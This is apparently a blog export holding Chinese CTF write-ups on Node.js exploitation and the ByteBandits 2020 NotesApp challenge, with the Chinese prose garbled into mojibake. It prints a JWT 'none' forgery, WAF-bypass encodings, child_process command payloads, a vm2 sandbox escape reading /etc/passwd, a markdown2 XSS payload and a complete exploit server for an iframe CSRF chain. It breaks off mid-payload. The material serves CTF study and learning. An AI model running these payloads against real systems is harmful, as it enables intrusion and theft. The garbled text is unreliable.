å»çœ‹åŸé¢˜å°±èƒ½å­¦åˆ°å§¿åŠ¿ï¼šç”±äºsidæ˜¯è·Ÿæ®ç¬¬äºŒä¸ªâ€™.â€™çš„å†…å®¹å–å‡ºæ¥çš„,å¦‚æœç¨å¾®è®¾è®¡ä¸€ä¸‹ï¼Œæ¯”å¦‚ä»¤å€¼ä¸ºçº¯ä»»æ„å­—æ¯å­—ç¬¦ä¸²ï¼Œå°±èƒ½è¿‡é‚£ä¸ªifçš„åˆ¤æ–­å¹¶ä½¿secrets[sid]è¿”å›undefined.è¿™æ ·é…åˆä¸Šå‰é¢æˆ‘ä»¬ç½®ä¸ºNoneçš„åŠ å¯†æ–¹å¼,å³å¯åœ¨jwt.verifyæ—¶æˆåŠŸè§£ç ã€‚ æœ¬é¢˜è·ŸåŸé¢˜æœ‰ä¸€ä¸ç‚¹çš„åŒºåˆ«ï¼š!(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0))è¿™æ®µä»£ç çœ‹ä¼¼é™åˆ¶äº†æˆ‘ä»¬åªèƒ½ä¼ æœ‰æ•ˆçš„æ•°ç»„é”®å€¼å³æ•°å­—,ä½†æ˜¯æ•°å­—å­—ç¬¦ä¸²ä¾æ—§æœ‰æ•ˆ 123456789global.secrets=['supersecretkeyyouwillneverknow','2333333'];const sid=\"00\";console.log(sid);console.log(global.secrets.length);if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123; console.log(\"no\");&#125;const secret = global.secrets[sid];console.log(secret); å‡è®¾è¿™æ˜¯æˆ‘ä»¬å·²ç»æ³¨å†Œè¿‡2ä¸ªç”¨æˆ·çš„æƒ…å†µã€‚ç°åœ¨çœ‹çœ‹æ‰§è¡Œç»“æœ æ²¡æœ‰æŠ¥é”™ã€‚è¯´æ˜æ­£å¦‚æˆ‘ä»¬æ‰€æ–™,è¿›è¡Œ&gt;æˆ–è€…&gt;=è¿™ä¸¤ä¸ªè¿ç®—ç¬¦åå­—ç¬¦ä¸²sidè¢«è½¬æ¢æˆäº†æ•°å€¼ç±»å‹å³ 0(number) 0&lt;1 &amp;&amp; 0&gt;=0åŒæ—¶ä¸‹é¢çš„æ•°ç»„é”®å€¼ä¸å­˜åœ¨,å³secrets[â€œ00â€]ä¸å­˜åœ¨ã€‚æ‰€ä»¥è¿™é¢˜å¯ä»¥æ³¨å†Œnä¸ªç”¨æˆ·,(è‡³å°‘è¦æœ‰ä¸€ä¸ª),ç„¶åä¼ ä¸ªå°äºé•¿åº¦çš„æ•°å­—å­—ç¬¦ä¸²å°±è¡Œã€‚ å†ç®€å•ä¸€ç‚¹çš„,ç›´æ¥ä¼ ä¸€ä¸ªç©ºå­—ç¬¦ä¸²å½“ç„¶ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ç©ºæ•°ç»„ä¹Ÿæ˜¯åŒæ ·çš„é“ç†ã€‚ä¸”æ•°ç»„å¦‚æœä¼ å…ƒç´ çš„è¯ä¹Ÿä¼šéµå¾ªè·Ÿä¸Šé¢å­—ç¬¦ä¸²ä¸€æ ·çš„è½¬åŒ–è§„å¾‹æœ€ååŠ å¯†å³å¯ 1234import jwtpayload = &#123;'secretid': \"00\", 'username': 'admin', 'password': '123'&#125;print(jwt.encode(payload, '', algorithm=None)) å€¼å¾—ä¸€æçš„æ˜¯,çº¯å­—æ¯å­—ç¬¦ä¸²ä¸æ•°å­—æ¯”è¾ƒæ—¢ä¸æ»¡è¶³å¤§äºç­‰äºä¹Ÿä¸æ»¡è¶³å°äºç­‰äºï¼Œè¿™ä¹Ÿæ˜¯å›½é™…èµ›åŸé¢˜çš„å°æŠ€å·§ã€‚ ä½¿ç”¨ç¼–ç \\æ¨¡æ¿å­—ç¬¦\\æ•°ç»„ç­‰ç»•è¿‡wafNode.jsåœ¨ç¼–ç ä¸Šä¹Ÿæœ‰è®¸å¤šå¯ä»¥ç»•è¿‡çš„æŠ€å·§å¸¸è§çš„æ¯”å¦‚å…«è¿›åˆ¶,16è¿›åˆ¶,unicode 1234567\"constructor\"//oct\"\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162\"//hex\"\\x63\\x6f\\x6e\\x73\\x74\\x72\\x75\\x63\\x74\\x6f\\x72\"//unicode\"\\u0063\\u006f\\u006e\\u0073\\u0074\\u0072\\u0075\\u0063\\u0074\\u006f\\u0072\" å‡å¦‚æƒ³è°ƒç”¨å‘½ä»¤ 123[][&#39;constructor&#39;][&#39;constructor&#39;](&#39;alert(12345)&#39;)()[].constructor.constructor(&#39;alert(12345)&#39;)()Array.constructor(&#39;alert(12345)&#39;)() //ä¸Šé¢ä¸‰ç§å†™æ³•æ˜¯ç­‰ä»·çš„.ä¹‹å‰å…¬ç›Šèµ›NodeGameä¹Ÿæåˆ°è¿‡ã€‚ ä½†æ˜¯è¦æ³¨æ„ä¸€ç‚¹ã€‚è¿™é‡Œå…¶ä»–è¿›åˆ¶ä»¥åŠunicodeæƒ³è¦æˆåŠŸè¢«è§£ææˆå­—ç¬¦ä¸²è¿˜æ˜¯å¾—è¦å•æˆ–åŒå¼•å·ã€‚å¦åˆ™æ— æ³•æˆåŠŸæ‰§è¡Œã€‚é‚£ä¹ˆé‡åˆ°è¿‡æ»¤äº†å•åŒå¼•å·çš„wafæ€ä¹ˆåŠå‘¢ï¼Ÿ è¿™é‡Œå†ç»™å‡ºä¸€ç§æ–¹æ³•ã€‚æ¯”å¦‚è¿™æ¬¡è™ç¬¦just_escapeæˆ‘ä½¿ç”¨çš„ç»•è¿‡wafçš„payloadï¼š\\u0065val(String.fromCharCode(116,114,121,123,10,32,32,32,32,32,32......)) unicodeçš„ç»•è¿‡ä¸å¿…å¤šè¯´åé¢å­—ç¬¦ä¸²ä½¿ç”¨String.fromCharCodeä¹Ÿæ˜¯xssä¸­ç»å¸¸ç”¨åˆ°çš„æŠ€å·§äº†ã€‚å°±æ˜¯è¿™ä¸ªpayloadåœ¨icqæ‰“ä¸é€šâ€¦buuå¯è¡Œã€‚ä¸ç„¶æˆ‘å·®ç‚¹æ€€ç–‘æ–¹æ³•æ„é€ æœ‰é—®é¢˜äº†â€¦éš¾å— è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯ä»èµµå¸ˆå‚…é‚£é‡Œå­¦æ¥çš„æ¨¡æ¿å­—ç¬¦ä¸²çš„æ–¹æ³•,å…¶å®è‡ªå·±ä¹‹å‰ä¹Ÿç”¨è¿‡,å°±æ˜¯æ²¡æ·±åˆ»ç†è§£ã€‚ ç®€å•æ¥ç”¨å°±æ˜¯ç”¨åå¼•å·ä»£æ›¿åŒå¼•å·.æ‰€ä»¥ä¸Šé¢è¯´åªæœ‰å•åŒå¼•å·æ‰èƒ½è§£æè¿›åˆ¶æ˜¯é”™è¯¯çš„ã€‚ä½†æ˜¯ç»å®éªŒåå‘ç°,åªæœ‰å…«è¿›åˆ¶ä¼šåœ¨è¢«åå¼•å·åµŒå¥—æ—¶å‡ºç°æŠ¥é”™ã€‚è¿™ç‚¹æš‚æ—¶æ²¡æ‰¾åˆ°åŸå› ,æˆ‘çŒœæµ‹å¯èƒ½è·Ÿå…«è¿›åˆ¶è¿‡äºç®€ä¾¿çš„å†™æ³•æœ‰å…³å§ã€‚(jsè¯­æ³•ä¸­åªè¦â€\\143â€è¿™ç§å†™æ³•å°±é»˜è®¤ä¸ºå…«è¿›åˆ¶,æœ€å¤§ä¸ºâ€\\377â€) è€Œæ¨¡æ¿å­—ç¬¦ä¸²çš„å†™æ³•å…è®¸æˆ‘ä»¬è¿›è¡Œå­—ç¬¦æ‹¼æ¥ å½“ç„¶é’ˆå¯¹è™ç¬¦è¿™é“é¢˜è¿˜æœ‰æ•°ç»„ç»•è¿‡çš„ä¸€ä¸ªå§¿åŠ¿,å› ä¸ºåªæ˜¯æ¥å—å‚æ•°ï¼Œç„¶åè¿›è¡Œwafçš„è¾¨åˆ«,ä½¿ç”¨æ•°ç»„è‡ªç„¶ä¹Ÿæ˜¯å¯è¡Œçš„æ„é€ payloadä¸Šç®€å•äº†è®¸å¤šã€‚å…¶å®åŸç†è·Ÿä¸Šé¢å¼±ç±»å‹çš„trickä¸€æ ·ï¼Œå½“æ•°ç»„åˆ†åˆ«ä¸º 12[\"process\"] //waf[\"global.process\"] // ç»•è¿‡ ä¸Šé¢è¢«wafæŒ¡ä½æ˜¾ç„¶æ˜¯å› ä¸ºæ•°ç»„çš„å€¼ç›´æ¥æå–å‡ºæ¥ä¸wafä¸­è¿‡æ»¤çš„æ¯ä¸€ä¸ªå…³é”®å­—æ¯”è¾ƒã€‚ä½†æ˜¯å¦‚æœæ˜¯å®Œæ•´çš„payloadå­—ç¬¦ä¸²æ˜¾ç„¶ä¸ä¼šè¢«ä»»ä½•å•ä¸ªçš„wafå…³é”®å­—åŒ¹é…åˆ°ã€‚ ä¸‹é¢è¿™ä¸ªpaypalçš„RCEä¾‹å­ä¹Ÿå¯ä»¥å‚è€ƒä¸‹https://artsploit.blogspot.com/2016/08/pprce2.html å…³äºæ•°ç»„ç»•è¿‡è¿˜æœ‰ä¸€ä¸ªæœ‰è¶£çš„trickæ¥è‡ªHackTM2020 Draw with ushttps://xz.aliyun.com/t/7177#toc-4é‡Œé¢æœ‰ä¸€ä¸ªç‚¹,éœ€è¦è·å–nçš„å€¼ã€‚ä½†æ˜¯nåˆè¢«wafæŒ¡ä½äº† 12345678910function checkRights(arr) &#123; let blacklist = [\"p\", \"n\", \"port\"]; for (let i = 0; i &lt; arr.length; i++) &#123; const element = arr[i]; if (blacklist.includes(element)) &#123; return false; &#125; &#125; return true;&#125; è¿™é‡ŒåŒæ ·å¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ã€‚åœ¨jsä¸­,a[[â€œnâ€]]è¿˜æ˜¯è¢«ç†è§£æˆa.n æ‰€ä»¥wafåŒ¹é…ä¸åˆ°,ä½†æ˜¯è¿™æ ·ä»æ—§èƒ½è·å–nè¿™ä¸ªé”®çš„å€¼ã€‚ æ‰€ä»¥ä»¥ä¸Šå‡ ç§å†™æ³•åº”è¯¥å¯ä»¥è§£å†³å¤§å¤šæ•°wafäº†ã€‚ å‘½ä»¤æ‰§è¡Œä¸æ²™ç›’é€ƒé€¸jsé‡Œè°ƒç”¨å‡½æ•°æœ‰ä¸€ä¸ªè‡ªå·±ä¹‹å‰ä¸€ç›´ä¸å¤ªæ‡‚çš„ç‚¹ç»ˆäºå¼„æ˜ç™½äº†ã€‚ IIFE 123(function()&#123; /* code */ &#125;());(function()&#123; /* code */ &#125;)(); è¿™æ˜¯IIFEï¼ˆç«‹å³è°ƒç”¨å‡½æ•°è¡¨è¾¾å¼ï¼‰çš„å†™æ³•ã€‚javascriptåœ¨é‡åˆ°å®ƒä¹‹åå°†ç«‹å³æ‰§è¡Œå‡½æ•°ã€‚ åœ¨ååºåˆ—åŒ–æ¼æ´CVE-2017-5941 ä¸­æœ‰ä¸€å¤„evalçš„æ‹¼æ¥æ‰§è¡Œï¼Œå°±æ˜¯ç”¨åˆ°äº†è¿™ä¸ªã€‚å› ä¸ºevalåçš„è¯­å¥æ˜¯è¢«æ‹¬å·åŒ…è£¹äº†çš„ã€‚å…¶å®è¯´èµ·æ¥ä¹Ÿç®€å•ã€‚åŠ ä¸ªæ‹¬å·è€Œå·²ã€‚ç„¶åå‘½ä»¤åœ¨ååºåˆ—åŒ–æ—¶ç›´æ¥è§¦å‘ã€‚ ç„¶åå…³äºå‘½ä»¤æ‰§è¡Œçš„å‡ ä¸ªå¸¸è§payload,æ¯”å¦‚åŸå‹é“¾ä¸­å¸¸ç”¨çš„payload 123require('child_process').exec('calc')global.process.mainModule.constructor._load('child_process').exec('calc')global.process.mainModule.require('child_process').exec('calc') å¤§ä½“ä¸Šå°±è¿™å‡ ç§æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼ã€‚å…¶å®ç®€å•è¯´å°±æ˜¯èƒ½è·å–åˆ°child_processè¿™ä¸€æ­¥å°±è¡Œäº†ã€‚å› ä¸ºNode.jsä¸­çš„chile_process.execè°ƒç”¨çš„æ˜¯/bash.shï¼Œå®ƒæ˜¯ä¸€ä¸ªbashè§£é‡Šå™¨ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚è€Œç›´æ¥requireæœ‰æ—¶å€™æ˜¯è·å–ä¸åˆ°çš„,è¿™ç‚¹pç‰›ä¹Ÿè®²è¿‡äº†ã€‚ æ²™ç›’é€ƒé€¸å…¶å®æ²™ç›’é€ƒé€¸çš„é¢˜ä¹Ÿä¸æ—¶ç¬¬ä¸€æ¬¡åšã€‚ä¹‹å‰HITCONä¹Ÿæœ‰è¿‡è¿™æ ·çš„é¢˜,Confidenceä¸Šä¹Ÿæœ‰æ²™ç›’çš„é¢˜ã€‚ä½†æ˜¯è¿™æ¬¡æ¯”èµ›è¿˜æ˜¯æ‹‰èƒ¯äº†ã€‚è™½ç„¶æ˜¯ç¯å¢ƒçš„é—®é¢˜,ä½†è¦æ˜¯æ¥è§¦å¤šçš„è¯æ¢payloadæ‰“åº”è¯¥æ˜¯å¾ˆè½»æ¾çš„å§ã€‚æ‰€ä»¥è¿˜æ˜¯ç®€å•æ¥è§¦ä¸‹ https://github.com/patriksimek/vm2/issuesé¦–å…ˆè¦æ‰¾ç°æˆpayloadçš„è¯,ç›´æ¥ä¸Šgithubä¸Šissueæ‰¾å°±å¥½äº†,æœ‰ä½dalaoä¸“ä¸šç ”ç©¶æ²™ç›’é€ƒé€¸,åŸºæœ¬ä¸Šæ‰€æœ‰ç‰ˆæœ¬çš„payloadéƒ½æ˜¯ä»–æ‰¾çš„,ç›´æ¥issueé‡Œæœbreakoutå³å¯ã€‚ ç„¶åæ˜¯åŸç†ã€‚å…¶å®å°±æ˜¯ç›¸å½“äºç»™ä¸ªæ²™ç›’ç¯å¢ƒã€‚åƒprocessè¿™æ ·çš„å±é™©ä»£ç åŸºæœ¬éƒ½æ˜¯undefinedçš„ã€‚æ‰€ä»¥æ‰æœ‰äº†é€šè¿‡this.constructor.constructor(&#39;return this.process.env&#39;)()bypassçš„payloadå‡ºç°ã€‚(è·Ÿpythonsstiæ²™ç›’é€ƒé€¸å·®ä¸å¤šä¸æ˜¯å—)vm2ç›¸æ¯”äºvmç¯å¢ƒé™åˆ¶æ›´åŠ ä¸¥æ ¼ã€‚åŸå…ˆé€šè¿‡thisè·å–constructorçš„æ–¹æ³•ä¸å†è¡Œå¾—é€šã€‚ç›®å‰ä¸»æµçš„æ–¹æ³•ä¸»è¦æ˜¯é€šè¿‡trycatchè¯­å¥æ„é€ ã€‚é€šè¿‡tryè¯­å¥ä¸­æŠ¥é”™è¿›å…¥åˆ°catchå—,å‡å¦‚catchå—æ•æ‰åˆ°çš„é”™è¯¯æ¯”å¦‚æ˜¯ç”±hostæ‰”å‡ºçš„,å°±èƒ½åˆ©ç”¨ä¸åŠ é™åˆ¶çš„hostä¸€æ­¥æ­¥è·å–å±æ€§åˆ°requireè¿›è€Œå‘½ä»¤æ‰§è¡Œã€‚ 12345678910try &#123; this.process.removeListener(); &#125; catch (host_exception) &#123; console.log('host exception: ' + host_exception.toString()); host_constructor = host_exception.constructor.constructor; host_process = host_constructor('return this')().process; child_process = host_process.mainModule.require(\"child_process\"); console.log(child_process.execSync(\"cat /etc/passwd\").toString()); &#125; è™ç¬¦è¿™é¢˜åˆ™åŸºæœ¬å°±æ˜¯æŒ‰hackimçš„babyjsæ”¹çš„ã€‚å‰ç«¯éƒ½å‡ ä¹ä¸€æ ·ã€‚åªä¸è¿‡vmç‰ˆæœ¬æ¢æˆäº†3.8.3â€¦æ‰€ä»¥æœä¸‹issueå°±è¡Œäº†ã€‚bypassç”¨ä¸Šé¢æ€»ç»“çš„æ–¹æ³•éƒ½å¯ä»¥ã€‚ å…³äºæ²™ç›’é€ƒé€¸çš„ä¸€äº›ç»†èŠ‚æˆ‘ä¹Ÿæ˜¯ä¸å¤ªæ‡‚ã€‚æ‰“ç®—è¿‡æ®µæ—¶é—´æŠŠå›½é™…èµ›ä¸Šjsæ²™ç›’é€ƒé€¸çš„é¢˜è¡¥ä¸€ä¸‹ã€‚ç›®å‰çš„å¥—è·¯ç®€å•æœ‰ï¼šError().stackä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥çˆ†å‡ºstack strace.ç›¸å½“äºæ˜¯ä¸€ä¸ªFUZZæ‰‹æ®µäº†.çˆ†å‡ºé”™è¯¯ä¿¡æ¯å¦‚vm.jsæˆ–è€…vm2.jså°±å¯ä»¥å»æ”¶é›†å¯¹åº”çš„payloadäº†ã€‚ æ—¥åå†ç¢°åˆ°æ²™ç›’é€ƒé€¸çš„é¢˜ä¹Ÿä¼šæ”¾åˆ°æ–‡ç« é‡Œæ€»ç»“ã€‚å¸Œæœ›è‡ªå·±èƒ½å°½å¿«ä¸Šæ‰‹Node.jså§ã€‚ Referencehttps://xz.aliyun.com/t/7184https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"Node.js","slug":"Node-js","permalink":"https://www.bycsec.top/tags/Node-js/"}]},{"title":"ByteBanditsCTF2020ä¸¤é“WEBå¤ç°","slug":"ByteBanditsCTF2020ä¸¤é“WEBå¤ç°","date":"2020-04-13T12:15:56.000Z","updated":"2021-02-18T05:08:50.517Z","comments":true,"path":"2020/04/13/ByteBanditsCTF2020ä¸¤é“WEBå¤ç°/","link":"","permalink":"https://www.bycsec.top/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/","excerpt":"è¿™å‘¨æœ«åˆå½“äº†æ³¢å›½é™…èµ›åˆ’æ°´æ‡’ç‹—ã€‚çœ‹äº†å‡ ä¸ªæ¯”èµ›éš¾åº¦å‚å·®ä¸é½ã€‚åªæœ‰bytebanditsçš„éš¾åº¦ç¡®å®é¡¶ã€‚å½“æ—¶çœ‹äº†ä¸‹NotesAppæ²¡åšå‡ºæ¥å°±åˆ’æ°´å»äº†ã€‚æ‰€å¹¸å®˜æ–¹å¾ˆè´´å¿ƒçš„ç»™äº†dockerçš„ç¯å¢ƒã€‚ç°åœ¨æŠŠä¸¤é“WEBå¤ç°ä¸‹,éƒ½æ˜¯å¾ˆæœ‰ä»·å€¼çš„é¢˜ç›®ã€‚","text":"è¿™å‘¨æœ«åˆå½“äº†æ³¢å›½é™…èµ›åˆ’æ°´æ‡’ç‹—ã€‚çœ‹äº†å‡ ä¸ªæ¯”èµ›éš¾åº¦å‚å·®ä¸é½ã€‚åªæœ‰bytebanditsçš„éš¾åº¦ç¡®å®é¡¶ã€‚å½“æ—¶çœ‹äº†ä¸‹NotesAppæ²¡åšå‡ºæ¥å°±åˆ’æ°´å»äº†ã€‚æ‰€å¹¸å®˜æ–¹å¾ˆè´´å¿ƒçš„ç»™äº†dockerçš„ç¯å¢ƒã€‚ç°åœ¨æŠŠä¸¤é“WEBå¤ç°ä¸‹,éƒ½æ˜¯å¾ˆæœ‰ä»·å€¼çš„é¢˜ç›®ã€‚ NotesAPPè¿™é¢˜å¤ç°çš„è¯æœ‰ä¸€ä¸ªé—®é¢˜,å°±æ˜¯è¦æ”¹ä¸‹æºç ã€‚ä¸€ä¸ªæ˜¯æ”¹botçš„è®¿é—®åœ°å€ã€‚å†ä¸€ä¸ªå°±æ˜¯å› ä¸ºé‡Œé¢ç”¨äº†Googlecaptchakey,æ‰€ä»¥å¾—æ¢ã€‚ä½†æ˜¯æˆ‘ç»™è‡ªå·±çš„vpsç”³è¯·çš„keyæ¢äº†åè¿˜æ˜¯ä¸é¡¶ç”¨ã€‚ç´¢æ€§æŠŠç›¸å…³çš„htmlè·Ÿpythonä»£ç åˆ æ‰äº†,å§‘ä¸”æ˜¯èƒ½åšäº†hhh. é¦–å…ˆé¢˜ç›®ç»™äº†æºç ã€‚ç°åœ¨å¯ä»¥åˆ°å®˜æ–¹githubä¸Šçœ‹https://github.com/ByteBandits/bbctf-2020/tree/master/web/notes ç®€å•å®¡è®¡åé¦–å…ˆæ³¨æ„åˆ°ä¸€ä¸ªmarkdown xss 1234567891011121314@app.route(\"/profile\")@login_requireddef profile(): return render_template(\"profile.html\", current_user = current_user)@app.route(\"/update_notes\", methods=[\"POST\"])@login_requireddef update_notes(): if current_user.id == 'admin': return \"Nope.\" # markdown support!! current_user.notes = markdown2.markdown(request.form.get('notes'), safe_mode = True) db.session.commit() return redirect(\"/profile\") ç™»å½•è¿›å»ååœ¨/profileè·¯ç”±å³å¯updatemarkdownå†…å®¹ã€‚è¿™é‡Œè‡ªç„¶æƒ³åˆ°markdownxssã€‚ä¸è¿‡å½“æ—¶å°è¯•äº†ä¸‹å¹¶æ²¡æœ‰æ‰“å‡ºæ¥ã€‚å› ä¸ºè¿™é‡Œç”¨åˆ°çš„æ˜¯markdown2è¿™ä¸ªåº“çš„safe_modeã€‚htmlæ ‡ç­¾éƒ½ä¼šç›´æ¥è½¬ä¹‰ã€‚åæ¥å‘ç°ç”¨åˆ°çš„æ˜¯githubä¸Šçš„ä¸€ä¸ªissue.https://github.com/trentm/python-markdown2/issues/341safe_modeæˆ–è€…escapeéƒ½æœ‰å¯¹åº”çš„xsspayload 1&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;q?&lt;!-&lt;[&lt;script&gt;alert(1);&#x2F;\\*](http:&#x2F;&#x2F;g)-&gt;a&gt;&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;g.c?&lt;!-&lt;[a\\\\*&#x2F;&lt;&#x2F;script&gt;alert(1);&#x2F;*](http:&#x2F;&#x2F;g)-&gt;a&gt; å¾—åˆ°ä¸€ä¸ªself-xss. å¾—åˆ°self-xssçš„ç¬¬ä¸€æ­¥å°±æ˜¯åº”è¯¥è€ƒè™‘å¦‚ä½•æå‡xssçš„å±å®³æ€§ã€‚å› ä¸ºæˆ‘ä»¬çš„é¢˜ç›®è¿˜æœ‰ä¸€å¤„/send_linkè·¯ç”±æ˜æ˜¾æ˜¯æäº¤urlåè®©botè¿›è¡Œè®¿é—®ã€‚é‚£ä¹ˆè¿™é‡Œå¯èƒ½éœ€è¦è€ƒè™‘csrfã€‚å› ä¸ºåªæœ‰adminç™»å½•è®¿é—®profileä¼šå¾—åˆ°flagã€‚æˆ‘ä»¬è®¿é—®è‡ªå·±çš„profileåªèƒ½å¾—åˆ°è‡ªå·±çš„å†…å®¹ã€‚ä¼ ç»Ÿçš„CSRFä¸€å®šæ˜¯éµå¾ªä»¥ä¸‹åŸåˆ™çš„ï¼š 121.ç™»å½•å—ä¿¡ä»»ç½‘ç«™Aï¼Œå¹¶åœ¨æœ¬åœ°ç”ŸæˆCookieã€‚2.åœ¨ä¸ç™»å‡ºAçš„æƒ…å†µä¸‹ï¼Œè®¿é—®å±é™©ç½‘ç«™Bã€‚ é‚£ä¹ˆåŸºäºæ­¤é¢˜botçš„å­˜åœ¨,æˆ‘ä»¬å¤§æ¦‚çš„æµç¨‹æ˜¯ï¼š 1231.è®©botè®¿é—®profile,æ­¤æ—¶å­˜åœ¨flag2.logout3.ç™»å½•æ„é€ å¥½payloadçš„ç”¨æˆ·ï¼Œå¹¶åŠ è½½payload.å¾—åˆ°adminçš„ä¿¡æ¯ ä½†æ˜¯å­˜åœ¨å‡ ä¸ªç»†èŠ‚ï¼šå¦‚ä½•æ§åˆ¶botç™»å‡ºå¹¶ç™»å½•ï¼Ÿå¦‚ä½•è®©æˆ‘ä»¬çš„payloadèƒ½å¤Ÿå¾—åˆ°adminé¡µé¢çš„ä¿¡æ¯ï¼Ÿ ä»”ç»†è§‚å¯Ÿå‘ç°ä¸€ä¸ªç»†èŠ‚ã€‚å½“æˆ‘ä»¬æ³¨å†Œæ—¶,ç”¨æˆ·åä¸å¯†ç é€šè¿‡postæ–¹å¼è¯·æ±‚ã€‚ä½†æ˜¯å½“æˆ‘ä»¬ç™»å‡ºå†ç™»å½•æ—¶ï¼Œå´æ˜¯é€šè¿‡getè¯·æ±‚è¿›è¡Œç™»å½•ã€‚å› æ­¤å…ˆç™»å‡ºå†ç™»å½•çš„ç»†èŠ‚å°±è§£å†³äº†ã€‚è‡³äºåŠ è½½adminçš„ä¿¡æ¯ï¼Œä½¿ç”¨åˆ°çš„è‡ªç„¶æ˜¯ç»å…¸çš„iframe xss ã€‚åŸæ¥æ€»ç»“CSPæ—¶ç”¨è¿‡ã€‚ç»å…¸çš„åˆ©ç”¨å°±æ˜¯ï¼šä¸€ä¸ªåŒæºé¡µé¢ï¼Œä¸€ä¸ªæ˜¯CSPä¿æŠ¤çš„flagé¡µé¢Aï¼Œä¸€ä¸ªæ˜¯å­˜åœ¨xssçš„é¡µé¢Bã€‚åªéœ€è¦ä¸€ä¸ªiframeå°±èƒ½çªƒå–åˆ°flag. 1234var iframe = document.createElement('iframe');iframe.src=\"Aé¡µé¢\";document.body.appendChild(iframe);setTimeout(()=&gt;alert(iframe.contentWindow.document.getElementById('flag').innerHTML),1000); æ­¤é¢˜å¹¶æ²¡æœ‰å¯¹iframeçš„é™åˆ¶ã€‚è‡ªç„¶æ˜¯å¯è¡Œçš„ æ‰€ä»¥æ„æ€åæˆ‘ä»¬çš„payloadåº”è¯¥æ˜¯ 1231.æäº¤url,è®©botè®¿é—®æˆ‘ä»¬vpsä¸Šçš„å†…å®¹2.å…ˆåŠ è½½ä¸€ä¸ªiframeå»è®¿é—®profileå¹¶ç™»å‡º3.å†åŠ è½½ä¸€ä¸ªiframeï¼Œé€šè¿‡urlç›´æ¥ç™»å½•æˆ‘ä»¬è‡ªå»ºè´¦å·ã€‚è§¦å‘payload ç„¶è€Œè¿™é¢˜æœ‰ä¸ªå‘ æ³¨æ„åˆ°visit_link.pyä¸­ 12345678910111213141516171819202122232425262728293031323334import asynciofrom pyppeteer import launchfrom redis import Redisfrom rq import Queueimport osimport psutil, signalasync def main(url): browser = await launch(headless=True, executablePath=\"/usr/bin/chromium-browser\", args=['--no-sandbox', '--disable-gpu']) try: page = await browser.newPage() await page.goto(\"https://notes.web.byteband.it/login\") await page.type(\"input[name='username']\", \"admin\") await page.type(\"input[name='password']\", os.environ.get(\"ADMIN_PASS\")) await asyncio.wait([ page.click('button'), page.waitForNavigation(), ]) newPage = await browser.newPage() await newPage.goto(url) except Exception as e: raise e finally: await browser.close()def visit_url(url): asyncio.get_event_loop().run_until_complete(main(url))q = Queue(connection=Redis(host='redis')) è¿™ä¸²å¼‚æ­¥ä»£ç è®©adminåªè¦è®¿é—®äº†åç«‹å³é€€å‡ºã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çš„payloadå¹¶ä¸ä¼šæœ‰æ—¶é—´è§¦å‘ã€‚ å› æ­¤éœ€è¦é¢å¤–è®¾è®¡ï¼Œæ¯”å¦‚èµ·ä¸€ä¸ªflaskæ§åˆ¶botè®¿é—®æ—¶è¿›è¡Œåœé¡¿ï¼Œè¿™æ ·å°±æœ‰æ—¶é—´è§¦å‘payloadäº†ã€‚ä¸‹é¢æ˜¯dalaoçš„è„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!/usr/bin/env python3import timefrom http.server import BaseHTTPRequestHandler,HTTPServerPORT_NUMBER = 8877SERVER = \"https://notes.web.byteband.it\"USERNAME = \"abc\"PASSWORD = \"123\"EXPLOIT = \"\"\"&lt;html&gt;&lt;body&gt;&lt;script type='text/javascript'&gt;function loginUser() &#123;&#123; var iframe = document.createElement('iframe'); iframe.style.display = \"none\"; iframe.src = \"&#123;server&#125;/login?username=&#123;username&#125;&amp;password=&#123;password&#125;\"; iframe.sandbox = \"allow-same-origin allow-scripts\"; document.body.appendChild(iframe);&#125;&#125;;function logoutUser() &#123;&#123; var iframe = document.createElement('iframe'); iframe.style.display = \"none\"; iframe.onload = loginUser; iframe.src = \"&#123;server&#125;/logout\"; iframe.sandbox = \"allow-same-origin allow-scripts\"; document.body.appendChild(iframe);&#125;&#125;;&lt;/script&gt;&lt;iframe id=\"iframe01\" name=\"iframe01\" src=\"&#123;server&#125;/profile\" sandbox=\"allow-same-origin allow-scripts\" onload=\"logoutUser(this)\"&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;\"\"\".format(server=SERVER, username=USERNAME, password=PASSWORD)class MyServer(BaseHTTPRequestHandler): def do_GET(self): self.send_response(200) self.send_header(\"Content-type\", \"text/html\") self.end_headers() self.wfile.write(EXPLOIT.encode('utf-8')) time.sleep(10) # keep open for some time for exploit to finishmyServer = HTTPServer((\"0.0.0.0\", PORT_NUMBER), MyServer)print(time.asctime(), \"Server Starts - %s:%s\" % (\"0.0.0.0\", PORT_NUMBER))try: myServer.serve_forever()except KeyboardInterrupt: passmyServer.server_close()print(time.asctime(), \"Server Stops - %s:%s\" % (\"0.0.0.0\", PORT_NUMBER)) ä»è¿™è¡Œä»£ç å°±èƒ½çœ‹å‡ºä¸»è¦æµç¨‹è·Ÿä¹‹å‰æ„æ€çš„æ€è·¯æ˜¯ä¸€è‡´çš„ã€‚&lt;iframe id=&quot;iframe01&quot; name=&quot;iframe01&quot; src=&quot;{server}/profile&quot; sandbox=&quot;allow-same-origin allow-scripts&quot; onload=&quot;logoutUser(this)&quot;&gt;&lt;/iframe&gt;ä¸»è¦å°±æ˜¯è¦sleep10s.åœ¨vpsä¸Šè¿è¡Œã€‚ç„¶åæˆ‘ä»¬ç”¨è‡ªå·±çš„abcç”¨æˆ·updatepayload 1&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;q?&lt;!-&lt;[&lt;script&gt;(new 